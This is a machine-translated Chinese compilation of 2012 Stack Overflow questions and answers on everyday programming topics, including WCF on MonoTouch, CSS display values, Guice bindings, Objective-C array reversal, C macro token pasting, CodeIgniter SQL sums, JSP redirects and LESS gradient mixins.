                            translateTransform.Y -= e.VerticalChange;
                            wrapPanel1.Children.Remove(lastObject);
                            wrapPanel1.Children.Remove(swapitem);
                            // wrapPanel1.Children.RemoveAt(index2);
                            if (index < index2)
                            {
                                wrapPanel1.Children.Insert(index, swapitem);
                                wrapPanel1.Children.Insert(index2, b);
                            }
                            else
                            {
                                wrapPanel1.Children.Insert(index2, b);
                                wrapPanel1.Children.Insert(index, swapitem);
                            }
                            break;
                        }}

                }

            } 
```

# wcf - 使用 MonoTouch 的 WCF 服务通信

> ID：14039077
> 
> 赞同：1
> 
> 时间：2012-12-26T10:14:13.240
> 
> 标签：wcf, ipad, xamarin.ios

从 Monotouch 调用 WCF 服务时，谁能指出我从哪里开始的正确方向？

我正在使用 Monotouch 开发一个 iPad 应用程序，它的数据需要由 WCF 服务提供

保罗

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-30T14:58:00.170

正如 igor 在他的评论中所说，尝试[http://docs.xamarin.com/ios/Guides/Application_Fundamentals/Introduction_to_Web_Services#Consuming_WCF_Services](http://docs.xamarin.com/ios/Guides/Application_Fundamentals/Introduction_to_Web_Services#Consuming_WCF_Services)以获得非常好的介绍。

此外，此视频可能对[http://www.youtube.com/watch?v=BV76V_LVqpM有所帮助](http://www.youtube.com/watch?v=BV76V_LVqpM)

还有关于如何做跨平台 wcf 客户端的文章 - 例如[http://sim4all.com/blogging/?p=173](http://sim4all.com/blogging/?p=173)

# html - 显示无和显示块之间的区别

> ID：14039079
> 
> 赞同：13
> 
> 时间：2012-12-26T10:14:28.207
> 
> 标签：html, css, styling

`display: none`设置控件的样式和设置有什么区别`display: block`？

* * *

## 回答 #1

> 赞同：18
> 
> 时间：2012-12-26T10:16:48.770

display 属性定义了某个 HTML 元素应该如何显示。显示`block`和`none`用于显示或隐藏 html 元素。**[您可以在此处](http://www.w3schools.com/cssref/pr_class_display.asp)**阅读有关显示属性和可用选项的更多信息。

*   none：该元素根本不显示。

*   block：显示为块级元素的元素（如段落和标题）

* * *

## 回答 #2

> 赞同：13
> 
> 时间：2012-12-26T10:19:00.603

**显示：无；**- 元素在`DOM`但不可见并且不占用任何`space`不同`visibility:hidden`。

**显示：块；**- 一个块元素占用了`full width`可用的元素，并且不允许在它们旁边放置其他元素。例子：`div`

* * *

## 回答 #3

> 赞同：3
> 
> 时间：2012-12-26T10:33:16.907

这两个样式属性做了两个不同的事情。

**display: none**从文档中完全删除元素。它不占用任何空间，即使它的 HTML 仍在源代码中。（该元素根本不会生成框）

**display: block**元素将跨越可用空间的整个宽度。（元素前后的换行符）

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2013-08-22T18:16:22.313

还有另一个细微差别要显示：无；如果您将 div 作为子 div 动态插入到父 div——***并且您将子的可见性属性显式设置***为“可见”，则父级的可见性属性只会使父级可见/不可见；无论父母的可见性设置如何，孩子都将保持可见。

在这种情况下（父/子可见性由不同的样式规则设置），父级上的 display:none 设置***将***隐藏所有子级——即使父/子级是独立样式的。*强调文本*

* * *

## 回答 #5

> 赞同：1
> 
> 时间：2014-02-02T20:01:42.287

display: none 表示该元素根本不显示（因此您也不会在示例中看到它）。

display: block 意味着元素显示为一个块，就像段落和标题一样。一个块的上下都有一些空白，并且它旁边不允许有 HTML 元素，除非另有命令

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-26T10:17:53.783

您在询问我认为的 CSS 属性。这用于显示/隐藏 DOM 元素

CSS 属性为 display，值为 'none'、'block' 等

参考：[http](http://w3fools.com/) ://w3fools.com/建议的**[CSS 显示](http://docs.webplatform.org/wiki/css/properties/display)**

**堵塞**

***对象被渲染为块元素。***

**没有任何**

***不渲染元素。元素（对布局没有影响）；所有子元素的显示也会关闭。文档呈现为好像该元素不存在一样。***

**排队**

默认。对象被呈现为一个内联元素，其大小由内容的尺寸决定。

**项目清单**

Internet Explorer 6 及更高版本。对象呈现为块元素，并添加了列表项标记。

**表头组**

对象被渲染为头。表格标题始终显示在所有其他行和行组之前，以及任何顶部标题之后。标题显示在由表格跨越的每个文档上。

**表页脚组**

对象呈现为 tFoot。表格页脚始终显示在所有其他行和行组之后，并且在任何底部标题之前。页脚显示在表格跨越的每个文档上。

**内联块**

对象被内联渲染，但对象的内容被渲染为块元素。在空间允许的情况下，相邻的内联元素呈现在同一行上。

* * *

## 回答 #7

> 赞同：0
> 
> 时间：2012-12-26T10:20:21.720

无显示：隐藏控件。通过设置元素 style="display:none" 的属性，元素不会在网页中呈现，也不会发生

显示块：以块级显示网页上的元素

* * *

## 回答 #8

> 赞同：0
> 
> 时间：2012-12-26T10:20:32.513

Display none 将隐藏包含，如果您将其应用于 div，则 div 的宽度和高度也将隐藏。显示块将显示包含。

* * *

## 回答 #9

> 赞同：0
> 
> 时间：2012-12-26T10:21:38.773

`Display:none;`表示该元素不会显示，`Display:block;`表示该元素显示为块级元素（如段落和标题）。

# .net - 我可以在 TransactionScope 中指定事务名称吗

> ID：14039085
> 
> 赞同：4
> 
> 时间：2012-12-26T10:14:57.490
> 
> 标签：.net, sql-server, transactionscope

我知道我可以指定交易名称

```
SqlConnection.BeginTransaction("SampleTransaction"); 
```

但在 TransactionScope 的情况下似乎没有办法。有人可以给出一些提示吗？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T16:45:29.403

空无一人。

原因是[`System.Transaction`命名空间](http://msdn.microsoft.com/en-us/library/system.transactions.aspx)中的类可以应用于*任何*事务资源，而不仅仅是 SQL Server。

也就是说，如果您有一个[`TransactionScope`](http://msdn.microsoft.com/en-us/library/system.transactions.transactionscope.aspx)使用 SQL Server 管理事务的系统，以及[诸如 NTFS 之类的事务文件系统](http://en.wikipedia.org/wiki/Transactional_NTFS)，则该名称对 NTFS 没有任何意义。

如果您想使用名称，并且您*只*使用 SQL Server，那么您需要从[`SqlConnection`类](http://msdn.microsoft.com/en-us/library/system.data.sqlclient.sqlconnection.aspx)管理事务（正如您在调用[`BeginTransaction`方法](http://msdn.microsoft.com/en-us/library/k1562zz1.aspx)时所显示的那样），否则无法使用`TransactionScope`(尽管我确实认为会有某种信息，即使是以[`TransactionInformation`类](http://msdn.microsoft.com/en-us/library/system.transactions.transactioninformation.aspx)扩展的形式）。

# java - 在 Guice 中将注释从一个提供者“继承”到另一个提供者

> ID：14039087
> 
> 赞同：1
> 
> 时间：2012-12-26T10:15:15.157
> 
> 标签：java, guice

假设我有 2 节课。

```
class A { ... }
class B {
 public B(A a) {...}
} 
```

我想创建一个获取名称并需要为带注释的 B 创建绑定的模块：

```
class MyModule extends AbstractModule {
  String name;
  public MyModule(String name) { this.name = name; }

  public void configure() {
    // CREATE BINDING for @Named(name)B which depends on @Named(name)A
  }
} 
```

为 B（或它的提供者）创建依赖于正确 A 的绑定的最佳方法是什么？

谢谢亚龙

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T21:21:06.573

本周我在[另一个 SO 线程](https://stackoverflow.com/a/14008377/1426891)中回答了一个非常相似的问题。

如果您知道要支持哪些注释，您将能够`PrivateModule`为每个注释创建一个，以便您可以公开 a`@Named("c1") B`以仅`@Named("c1") A`在需要绑定 A 的地方使用 a。

```
install(new PrivateModule() {
  @Override void configure() {
    // These are only bound within this module, and are not visible outside.
    bind(A.class).to(A1.class);
    // Though you can bind to other bindings which come from outside!
    bind(B.class).to(Key.get(B.class, Names.named("c1")));
    // Now expose the annotated bindings you'd like to expose.
    bind(C.class).annotatedWith(Names.named("c1")).to(C.class);
    expose(C.class).annotatedWith(Names.named("c1"));
  }
}); 
```

我认为没有办法说“对于所有注释 N，都可以`@N B`使用`@N A`，因为 Guice 被构建为从 (Annotation, TypeLiteral) 元组到提供者的精美映射，并且您要求推断可能的元组或者可能在依​​赖关系图中不存在。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:43:42.277

这个怎么样：

```
bind(B.class).annotatedWith(Names.named("name")).toProvider( new Provider<B>() {

    private A namedA;

    @Inject
    public void setNamedA(@Named("name") A namedA ) {
        this.namedA = namedA;
    }      

    @Override
    public B get() {
        return new B( namedA );
    }

} ); 
```

它应该根据文档工作，虽然我没有测试过。

# iphone - 倒序排列

> ID：14039095
> 
> 赞同：0
> 
> 时间：2012-12-26T10:15:59.043
> 
> 标签：iphone, ios, nsarray, plist

我有带有字典列表（item0，item1，item2）的列表的Plist ..通常当我在屏幕上显示时..它按升序填充... ..我`item0 then item1 then item2......and so on`希望Plist以相反的顺序显示为`itemn,itemn-1.........item2,item1,item0`

![第一的](../Images/5fa16e12fb5dfe17efc5023f9548e749.png) .
这就是代码的运行方式...以及如何反转它..需要在`Array`下面进行更改

```
NSMutableArray *Array=[NSMutableArray arrayWithArray:[self readFromPlist]];

NSMutableArray *items = [[NSMutableArray alloc] init];

for (int i = 0; i< [Array count]; i++)
//how to reverse by making changes here
//for (int i =[Array count] ; i>0; i--) does not work
{

    id object = [Array objectAtIndex:i];

    if ([object isKindOfClass:[NSDictionary class]])
    {
        NSDictionary *objDict = (NSDictionary *)object;

           tempItemi  =[[ECGraphItem alloc]init];

        NSString *str=[objDict objectForKey:@"title"];
        NSLog(@"str value%@",str);
        float f=[str floatValue];

        //my code here
 } 
```

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:20:10.473

使用反向枚举

```
for (id someObject in [myArray reverseObjectEnumerator]){
    // print some info
    NSLog([someObject description]);
} 
```

对于您的代码：

```
for (id object in [Array reverseObjectEnumerator]){
    if ([object isKindOfClass:[NSDictionary class]])
    {
        NSDictionary *objDict = (NSDictionary *)object;

        tempItemi  =[[ECGraphItem alloc]init];

        NSString *str=[objDict objectForKey:@"title"];
        NSLog(@"str value%@",str);
        float f=[str floatValue];

        //my code here
    }
} 
```

* * *

同样在您的代码中：

```
//for (int i =[Array count] ; i>0; i--) does not work 
```

应该是

```
for (int i =[Array count]-1 ; i>=0; i--) 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-12-26T10:22:00.237

您正在迭代，`count to 1`而数组有来自索引的对象，`count-1 to 0`
例如
带有`10`对象的数组有来自索引`0`的对象`9`

```
for (int i =[Array count]-1 ; i >= 0; i--)
{
    id object = [Array objectAtIndex:i];

    if ([object isKindOfClass:[NSDictionary class]])
    {
        NSDictionary *objDict = (NSDictionary *)object;

        tempItemi  =[[ECGraphItem alloc]init];

        NSString *str=[objDict objectForKey:@"title"];
        NSLog(@"str value%@",str);
        float f=[str floatValue];

        //my code here
 } 
```

# regex - 替换文件中的类似字符串

> ID：14039097
> 
> 赞同：0
> 
> 时间：2012-12-26T10:16:08.843
> 
> 标签：regex, macos, shell, sed, grep

我有一个包含以下类型的字符串对的文件：

```
Call Stack: [UniqueObject1] | [UnOb2] | [SuspectedObject1] | [SuspectedObject2] | [SuspectedObject3] |  [UnOb3] | [UnOb4] | [UnOb5] | ... end till unique objects

Call Stack: [UniqueObject1] | [UnOb2] | 0x28798765 | 0x18793765 | 0x48792767 |  [UnOb3] | [UnOb4] | [UnOb5] | ... end till unique objects 
```

文件中出现了许多这样的对。该对的属性是该对的第一部分具有“SuspectedObject1”、“SuspectedObject2”等，在该对的第二部分中被这些对象的地址的 HEX-VALUES 替换。

我想要做的是，删除对的所有第二部分。

请注意，这些对不会以任何特定顺序出现，并且可能由多条线隔开。

我计划遍历这个文件的每一行，如果我看到一个十六进制字符串作为地址而不是可疑对象，我想开始比较以下正则表达式

```
Call Stack: [UniqueObject1] | [UnOb2] | * | * | * |  [UnOb3] | [UnOb4] | [UnOb5] | ... end till unique objects 
```

在整个文件中，如果一个字符串匹配，我想从文件中删除这个特定的行。

有人可以建议一种外壳方式来做到这一点吗？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-27T13:52:30.810

如果我正确理解了您的问题，您可能需要使用`awk`. 像这样运行：

```
awk -f script.awk file file 
```

内容`script.awk`：

```
BEGIN { 
    FS=" \\| "
}

FNR==NR {
    $3=$4=$5=""
    a[$0]++
    next
}

$3 ~ /^0x[0-9]{8}$/ {
    r=$0
    $3=$4=$5="" 
    if (a[$0]<2) { 
        print r
    }
    next
}1 
```

或者，这是单线：

```
awk -F ' \\| ' 'FNR==NR { $3=$4=$5=""; a[$0]++; next } $3 ~ /^0x[0-9]{8}$/ { r=$0; $3=$4=$5=""; if (a[$0]<2) print r; next }1' file{,} 
```

# postgresql - 查找它运行的 PostgreSQL 服务器主机名

> ID：14039101
> 
> 赞同：1
> 
> 时间：2012-12-26T10:16:31.007
> 
> 标签：postgresql, networking, postgresql-8.4

是否可以找到运行 PostgreSQL 服务器的主机？

* * *

## 回答 #1

> 赞同：5
> 
> 时间：2012-12-26T11:28:49.677

使用，但如果通过 Unix 域套接字建立连接`SELECT inet_server_addr()`，它将返回。`NULL`还有`inet_server_port()`哪个返回端口服务器正在侦听。

# android - 如何在Android中动态地将文本视图对齐到Linearlayout中的图像视图的右侧

> ID：14039108
> 
> 赞同：0
> 
> 时间：2012-12-26T10:16:58.913
> 
> 标签：android

```
LinearLayout ll = (LinearLayout)findViewById(R.id.linearLayout3);
TextView tv = new TextView(this);
ImageButton imb=new ImageButton(this);

ll.addView(tv);
tv.setSingleLine();

tv.setEllipsize(TruncateAt.MARQUEE);
tv.setHorizontallyScrolling(true);
tv.setFocusableInTouchMode(true);

tv.setText(myString1); 
```

这是我的代码，我现在可以显示数据了`textView`。但我想`imageButton`在左边放一个，`textView`这样就可以作为取消条。但我有一个问题。如何`imageButton`以编程方式设置文本视图的左侧？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-26T10:22:27.053

您的问题有两个解决方案。如果您只想在 textview 右侧显示图像，可以使用以下代码。

```
TextView textView = (TextView) findViewById(R.id.myTxtView);
textView.setCompoundDrawablesWithIntrinsicBounds(R.drawable.icon,0, 0,0); 
```

要不然

将您的线性布局的方向设置为水平并首先添加图像视图，然后添加文本视图。因此，它们将根据您的要求进行调整。

下面是示例。

```
 TextView tv = new TextView(this);
tv.setLayoutParams(new ViewGroup.LayoutParams(
        ViewGroup.LayoutParams.WRAP_CONTENT,
        ViewGroup.LayoutParams.WRAP_CONTENT));
   ImageButton imb=new ImageButton(this);
imb.setLayoutParams(new ViewGroup.LayoutParams(
        ViewGroup.LayoutParams.WRAP_CONTENT,
        ViewGroup.LayoutParams.WRAP_CONTENT));

   ll.addView(imb);
   ll.addView(tv); 
```

# c - 在 C 中创建变量的宏

> ID：14039114
> 
> 赞同：3
> 
> 时间：2012-12-26T10:17:12.643
> 
> 标签：c, macros

我想创建表单的几个变量：

```
static char fooObjectKey;
static char bazObjectKey;
static char wthObjectKey;
static char myObjectObjectKey;
... 
```

所以我写了

```
#define defineVar(x) static char #x ObjectKey

defineVar(foo);
defineVar(baz);
defineVar(wth);
defineVar(myObject); 
```

但我得到了错误：`Expected identifier or }`

我在这里做错了什么？:) 任何帮助表示赞赏

* * *

## 回答 #1

> 赞同：8
> 
> 时间：2012-12-26T10:20:07.650

您需要连接它们：

```
#define defineVar(x) static char x##ObjectKey 
```

解释：

预处理器运算符## 提供了一种在宏扩展期间连接实际参数的方法。如果替换文本中的参数与## 相邻，则将参数替换为实际参数，删除## 和周围的空白，并重新扫描结果。例如，宏粘贴连接它的两个参数：

`#define paste(front, back) front ## back`

所以`paste(name, 1)`创建了令牌`name1`。

* * *

## 回答 #2

> 赞同：3
> 
> 时间：2012-12-26T10:26:36.467

`#`in 宏用于字符串化参数，`##`用于宏中的连接...在您的情况下，以下是正确的语法..

```
#define defineVar(arg) static char arg##ObjectKey 
```

如果你用这个，

```
#define defineVar(x) static char #x ObjectKey 
```

变量声明变成...

```
static char "foo" ObjectKey; 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T10:23:36.907

使用双哈希进行连接

```
#define defineVar(x) static char x##ObjectKey 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T10:27:57.350

```
The ## operator concatenates two tokens into one token
Hence 
defineVar(foo) will be replace with static char fooObjectKey 
```

# php - 使用 codeigniter 中的连接活动记录获取 db 字段的总和

> ID：14039120
> 
> 赞同：1
> 
> 时间：2012-12-26T10:17:35.960
> 
> 标签：php, mysql, codeigniter, join, codeigniter-2

我有一个包含所有产品详细信息的表名 products 和另一个包含每个仓库产品数量详细信息的 whs_products。

我想从产品表中选择 id、代码和名称以及 products.id = whs_products.product_id 的数量总和

我正在尝试这个

```
$this->db->select("id, code, name");
$this->db->from("products");
$this->db->join('whs_products', 'products.id = whs_products.product_id');
$this->db->select("quantity"); 
```

我得到 whs_products 中存在的列表产品而不是总和。有些产品被列出两次，因为它们在 whs_products 中有 2 个条目。

**我想只列出一次所有产品，其中没有数量我想在数量上放 0 并且它在 whs_products 中大于 1 我想显示所有数量的总和**

帮助将不胜感激！

表结构

```
Products
id, code, name, unit, price

whs_products
id, product_id, warehouse_id, quantity 
```

我也有仓库**ID、名称、地址的****whs**表

 *** * *

我试过这个先生，

```
$this->db->select("products.id as productid, products.code, products.name, products.unit, products.cost, products.price,   sum(whs_products.quantity) as 'totalQuantity'")
->from('products')
->join('whs_products', 'whs_products.product_id=products.id', 'left')
->group_by("products.id");
$this->db->get(); 
```

一切安好。但产品总数计算错误。我认为系统将总产品数加 1，每次从 whs_products 获取数量。对于某些产品，数量是 2 或 3 次，具体取决于每个仓库。

任何解决方案。**我非常感谢您的支持。**

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-12-26T10:28:18.380

请尝试以下查询和评论。

*   [SQLFIDDLE 演示](http://sqlfiddle.com/#!2/58866/4)

样本数据：-

产品

```
PID     PNAME
1   j
2   k
3   m 
```

ws_产品展示

```
WID     PID     QUANTITY
11  2   300
11  2   200
14  2   500
11  1   300
15  3   100
14  3   800 
```

查询以按 pid in 获取总数`whs_products`

```
select pid, wid, sum(quantity) 
from whs_products
group by pid, wid
; 
```

结果：

```
PID     WID     SUM(QUANTITY)
1       11      300
2       11      500
2       14      500
3       14      800
3       15      100 
```

使用变量进行查询以获取`pid`pid、wid 的用户输入

```
-- group by pid and wid
set @var:='2'
;
select a.pid, b.pname, a.wid, sum(a.quantity) 
from whs_products a
join products b
on b.pid = a.pid
where a.pid = @var
group by a.pid, wid
; 
```

结果：

```
PID     PNAME   WID     SUM(A.QUANTITY)
2       k   11  500
2       k   14  500 
```

最终查询仅通过用户输入 pid 显示数量

询问：

```
-- by pid only    
set @var:='2'
;
select a.pid, b.pname, sum(a.quantity) 
from whs_products a
join products b
on b.pid = a.pid
where a.pid = @var
group by a.pid
; 
```

结果：

```
PID     PNAME   SUM(A.QUANTITY)
2       k   1000 
```

## 由于 OP 想要在 CodeIgniter

这是您尝试的先机。起初我的印象是您已经知道 SQL 的语法`codeigniter`并且正在寻找 SQL 逻辑，因此您可以将其转换为所需的格式。

```
$this->db->select("a.pid, b.pname, count(a.quantity) as 'toalQuantity'");
$this->db->from('wsh_products a');
$this->db->join('products b', 'a.pid=b.pid', 'inner');
$this->db->group_by("a.pid"); 
$where = "a.pid = 2";
$this->db->get();
$query->results_array(); 
```

或者写一个函数:)：

```
function getQuantity($prodid = false)
{
  $this->db->select(a.pid, b.pname, count(a.quantity) as 'toalQuantity');
  $this->db->join('wsh_products a', 'a.pid=b.pid');
  if ($prodid !== false)
    $this->db->where('a.pid', $prodid);
  $query = $this->db->get('products b');

  if($query->result() == TRUE)
  {
    foreach($query->result_array() as $row)
    {
      $result[] = $row;
    }
    return $result;
  }
} 
```

* * *

## `LEFT JOIN`按照评论中要求的 OP 进行编辑

*   [SQLFIDDLE](http://sqlfiddle.com/#!2/3b178/11)

要在 Products 表中显示所有产品，请执行以下操作：

*   在表中`select`显示。`pid``Products`

*   采用`from Products Left Join Whs_Products`

*   `Group by pid`从`Products`表**

# jsp - sendRedirect() 可以充当 post 方法而不是 get 吗？- jsp/servlet

> ID：14039121
> 
> 赞同：19
> 
> 时间：2012-12-26T10:17:37.260
> 
> 标签：jsp, redirect, post, get

我有一个简单的表单，它接受用户名和密码。如果登录有效，我必须使用`sendRedirect()`页面重定向到一个页面的方法，如果不是，则重定向到另一个页面。我需要使用`sendRedirect()`而不是`forward()`因为其他页面位于另一台服务器中。我注意到在使用时

```
response.sendRedirect(response.encodeRedirectURL("FileName.jsp?paramName=" +value)); 
```

正在`sendRedirect()`使用该`GET`方法，因为 URL 中显示了 name=value。这对我来说是不可取的，因为出于安全原因，我不希望这些值显示在 URL 中。

有没有办法`POST`使用 sendRedirect() 来获取这些值？我试图用`POST`隐藏我需要的值但仍然没有运气的方法做一个表格

请问我能做什么？谢谢 ：）

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-12-26T10:21:11.623

不，这是不可能的。我看到的唯一（肮脏）解决方法是转发到包含隐藏表单（使用 POST 方法）和提交此表单的 JavaScript 脚本的内部页面。

* * *

## 回答 #2

> 赞同：10
> 
> 时间：2014-04-17T08:57:20.427

这有点旧，但在这里我成功地运行了这个：

```
response.setStatus(307); //this makes the redirection keep your requesting method as is.
response.addHeader("Location", "http://address.to/redirect"); 
```

有关 HTTP 307 状态代码的说明，请参阅[http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html#sec10.3.8](http://www.w3.org/Protocols/rfc2616/rfc2616-sec10.html#sec10.3.8)。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2014-07-01T17:24:27.510

使用 javascript

```
$('#inset_form').html('<form action="FlowService" name="form" method="post" style="display:none;"><input type="hidden" name="idapp" value="' + idApp + '" /></form>');
        document.forms['form'].submit(); 
```

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-26T10:19:41.673

不，HTTP 重定向将始终对目标页面使用 GET。

但是，无论如何，POST 数据并不比 GET 数据安全得多。用户仍然可以篡改它们。而是将它们存储在会话中。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2012-12-26T10:22:21.997

看看这个：

```
String url = "http://www.mysite/servlets/theServlet";
RequestDispatcher dispatcher = servletContext().getRequestDispatcher(url);
dispatcher.forward(request, response); 
```

* * *

## 回答 #6

> 赞同：0
> 
> 时间：2012-12-26T10:25:19.513

在不提供任何参数的情况下使用 sendredirect，并将这些参数隐藏在会话范围的 servlet 中，如果您在重定向页面中需要这些参数，请通过此 servlet 使用它们。

# sql - 查询是否已添加好友

> ID：14039127
> 
> 赞同：1
> 
> 时间：2012-12-26T10:18:22.800
> 
> 标签：sql, sql-server-2008, postgresql, select

我有一个存储 users 表的用户 ID 和 user_friend_id 列的朋友表。

如果我想阻止添加已经由特定用户 ID 添加的朋友，我应该写什么查询？

```
UserId UserFriendId
1      12
1      13
1      15
2      14
2      17 
```

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-12-26T10:22:31.233

如果结果 ( `totalCount`) 的*值大于零*，则表示两个人已经是朋友。

```
SELECT COUNT(*) totalCount
FROM    tableName
WHERE   (userID = yourID AND UserFriendID = friendID) OR
        (userID = friendID AND UserFriendID = yourID) 
```

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-12-26T10:45:45.693

```
insert into friends (userId, userFriendId)
select 1, 12
where not exists (
    select 1 from friends where userId = 1 and userFriendId = 12
) 
```

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2012-12-26T16:10:43.623

只需创建具有 3 个参数的存储过程，如下所示：

```
CREATE PROCEDURE AddUserFriends
@UserID int,
@FriendID int,
@ExcludeUserID int -- the userid you want to exclude adding his friends
AS
BEGIN
INSERT INTO UserFriends(UserID, FriendID)
SELECT @UserID, @FriendID
WHERE @FriendID NOT IN(SELECT FriendID FROM UserFriends WHERE UserID=@ExcludeUserID)
END 
```

# sql - 从表中查找每 5 条记录

> ID：14039130
> 
> 赞同：1
> 
> 时间：2012-12-26T10:18:47.587
> 
> 标签：sql, sybase

一张表有n条记录`ABC`。编写一个查询以从表中选择每 5 条记录。

例如，一个表中有 30 行。所以查询应该从表中输出第 5、10、15、20、25 和 30 条记录。

我试过`ROW_NUMBER OVER (ORDER BY id )`但得到味精：-

来自 SQL 服务器 IML 的消息（消息 156，级别 15，状态 2）：

> 关键字“OVER”附近的语法不正确。

我正在使用 Sybase 数据库。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T11:32:17.147

You need to define order to get every 5th row. It can be for example PRIMARY KEY ID or something like this

```
select * from
(
  select ABC.*, ROW_NUMBER() OVER (ORDER BY id) as RN from ABC
) t1
where RN % 5 = 0 
```

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-12-26T10:20:38.193

这不是 SQL 的工作方式。我不确定哪一列会给你想要的东西，但你不应该知道或关心数据的存储方式或排序可能是什么。

您需要找出一个 WHERE 子句来满足您的需求。取决于顺序的东西是错误的。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-12-26T10:22:06.807

尝试这个

```
 select rn, col_list from (select rownum rn, col_list from tab_name)
  where rn=N; 
```

其中 N 是您想要的行号。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-12-27T09:56:25.143

试试这个方法。

创建带有标识列的临时表。

```
select 
id = identity(8),
column1,....
into #ABC
from ABC 
```

模数选择：

```
select * from #ABC
where  id % 5 = 0 
```

# css - 如何创建一个可以使用 CSS 渐变的 mixin？

> ID：14039131
> 
> 赞同：0
> 
> 时间：2012-12-26T10:18:47.973
> 
> 标签：css, less

我的代码中有以下内容：

```
 background: -moz-linear-gradient(
 top,
        white,
        #e5e5e5 88%,
        #d8d8d8
    );
    background: -webkit-gradient(
 linear,
        left top, left bottom,
        from(white),
        to(#d8d8d8),
        color-stop(0.88, #e5e5e5)
    ); 
```

和

```
background: -moz-linear-gradient(
    top,
    #8b8b8b,
    #a9a9a9 10%,
    #bdbdbd 30%,
    #bfbfbf
);
background: -webkit-gradient(
    linear,
    left top, left bottom,
    from(#8b8b8b),
    to(#bfbfbf),
    color-stop(0.1, #a9a9a9),
    color-stop(0.3, #bdbdbd)
); 
```

我想将这些实现为 mixin 并减少使用。但是，似乎我需要两个 mixin。有人能解释一下我怎么能做到这一点，以及两个 mixin 会是什么样子。对不起，如果这个问题有点简单，但我刚开始使用 mixins，我正在尝试理解编码它们的方式。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-12-27T03:33:26.527

LESS[使用模式匹配](http://lesscss.org/#-pattern-matching-and-guard-expressions)，所以你是正确的，它可能需要两个 mixin（一个需要一站，另一个需要两站）。下面的代码演示了这一点（它可能会进一步减少，但这使发生的事情变得相当明显）。请注意“名称”是如何相同的（在我的情况下是`setTopGradient`），但变量的数量是不同的。

**更正**：您的问题显示您使用小数作为止损点，但根据[此页面](https://www.webkit.org/blog/1424/css3-gradients/)`webkit`，这不是必需的。所以我将以下代码***更新为百分比。***

 ***较少的**

```
.setTopGradient(@startClr, @endClr, @st1Clr, @st1Pos) {

   background: -moz-linear-gradient(
      top,
      @startClr,
      @st1Clr @st1Pos,
      @endClr
   );

   background: -webkit-linear-gradient(
      linear,
      left top,
      left bottom,
      from(@startClr),
      to(@endClr),
      color-stop(@st1Pos, @st1Clr)
   );
}

.setTopGradient(@startClr, @endClr, @st1Clr, @st1Pos, @st2Clr, @st2Pos) {

   background: -moz-linear-gradient(
      top,
      @startClr,
      @st1Clr @st1Pos,
      @st2Clr @st2Pos,
      @endClr
   );

   background: -webkit-linear-gradient(
      linear,
      left top,
      left bottom,
      from(@startClr),
      to(@endClr),
      color-stop(@st1Pos, @st1Clr),
      color-stop(@st2Pos, @st2Clr)
   );
}

.someClass1 {
.setTopGradient(white, #d8d8d8, #e5e5e5, 88%);
}
.someClass2 {
.setTopGradient(#8b8b8b, #bfbfbf, #a9a9a9, 10%, #bdbdbd, 30%);
} 
```

**CSS 输出**

```
.someClass1 {
  background: -moz-linear-gradient(top, #ffffff, #e5e5e5 88%, #d8d8d8);
  background: -webkit-linear-gradient(linear, left top, left bottom, from(#ffffff), to(#d8d8d8), color-stop(88%, #e5e5e5));
}
.someClass2 {
  background: -moz-linear-gradient(top, #8b8b8b, #a9a9a9 10%, #bdbdbd 30%, #bfbfbf);
  background: -webkit-linear-gradient(linear, left top, left bottom, from(#8b8b8b), to(#bfbfbf), color-stop(10%, #a9a9a9), color-stop(30%, #bdbdbd));
} 
```*

# html - 内容 div 阴影未显示

> ID：14039134
> 
> 赞同：-4
> 
> 时间：2012-12-26T10:18:53.860
> 
> 标签：html, css

这是我最近项目中的代码，因为我是新手，所以此代码可能缺乏一些标准。

没有特色滑块的 html 示例页面

我为阴影定义的类被命名为“sawli”

## 代码 HTML

```
<div id="container-o">
<!-- Start of Main -->
<div id="main" class="sawli">
<div id="content">
<h1>Welcome to SEOCrust</h1><hr />
<p>This is a Parragraph Text</p>
</div>
</div><!-- End of Main --> 
```

* * *

## 用于那个的 CSS

```
#container-o{ /*Main container*/
    width:70%;
    display:block;
    padding:0;
    margin-top:-280px;
    margin-left:auto;
    margin-right:auto;
    position:relative;
}
#container-o p{
    font-size:18px;
}

#main{
    height:100%;
    width:100%;
    margin:20px auto;
    border:0px;
    padding:10px 10px 10px 10px;
}
.sawli {
    box-shadow:6px 0 4px  -4px #222 , -6px 0 4px  -4px #222;
    -moz-box-shadow:6px 0 4px  -4px #222 , -6px 0 4px  -4px #222;
    -webkit-box-shadow:6px 0 4px  -4px #222 , -6px 0 4px  -4px #222;    
}
#main #content{
    float:left;
    padding:0;
    position:relative;
} 
```

这是我的代码片段。

请帮我！

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-12-26T10:25:31.233

您正在为同一个 div 使用两个 id。尝试将 id="sawli" 更改为 class="sawli"，然后更改您的 CSS：

```
#sawli { ... } 
```

到

```
.sawli { ... } 
```

不允许在同一个对象上使用两个标识符。但是您可以将标识符和类结合起来。

您能否在此处复制您的代码，以便我们比下载您的代码更好地查看？

看到这个：

